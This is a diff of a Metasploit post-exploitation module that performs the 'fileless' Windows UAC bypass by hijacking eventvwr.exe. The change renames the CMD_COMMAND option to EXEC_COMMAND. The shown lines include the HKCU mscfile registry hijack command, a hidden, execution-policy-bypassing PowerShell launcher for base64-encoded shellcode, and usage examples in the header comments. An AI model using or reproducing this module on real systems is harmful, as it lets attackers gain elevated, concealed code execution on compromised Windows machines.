@@ -34,14 +34,14 @@
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on      => set SESSION 3
-# The cmd.exe command to be executed (target)   => set CMD_COMMAND start firefox.exe www.househot.com
+# The cmd.exe command to be executed (target)   => set EXEC_COMMAND start firefox.exe www.househot.com
 # Check target vulnerability settings/status?   => set CHECK_VULN true
 # Delete malicious registry hive keys/values?   => set DEL_REGKEY true
 # Exec powershell payload insted of a cmd comm? => set USE_POWERSHELL true
 # ---
 # HINT: To deploy a powershell payload we need to set USE_POWERSHELL true
-# and input the powershell base64 encoded shellcode into CMD_COMMAND
-# EXAMPLE: set USE_POWERSHELL true | set CMD_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
+# and input the powershell base64 encoded shellcode into EXEC_COMMAND
+# EXAMPLE: set USE_POWERSHELL true | set EXEC_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
 # ---
 #
 #
@@ -96,7 +96,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'enigma fileless uac bypass [RCE]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the CMD_COMMAND parameter, and runs eventvwr.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -135,7 +135,7 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('CMD_COMMAND', [ false, 'The cmd command to be executed (eg start notepad.exe)']),
+                                OptString.new('EXEC_COMMAND', [ false, 'The cmd command to be executed (eg start notepad.exe)']),
                                 OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false])
                         ], self.class)
 
@@ -158,15 +158,15 @@ def ls_stage1
   r=''
   session = client
   vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
-  exec_comm = datastore['CMD_COMMAND'] # my cmd command to execute
+  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # %comspec% path
   psh_comma = "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['CMD_COMMAND'] == 'nil'
+  if datastore['EXEC_COMMAND'] == 'nil'
     print_error("Options not configurated correctly...")
-    print_warning("Please set CMD_COMMAND option!")
+    print_warning("Please set EXEC_COMMAND option!")
     return nil
   else
     print_status("Hijacking eventvwr.exe process!")
@@ -395,7 +395,7 @@ def run
 # ------------------------------------
 # Selected settings to run
 # ------------------------------------
-      if datastore['CMD_COMMAND']
+      if datastore['EXEC_COMMAND']
          ls_stage1
       end
 
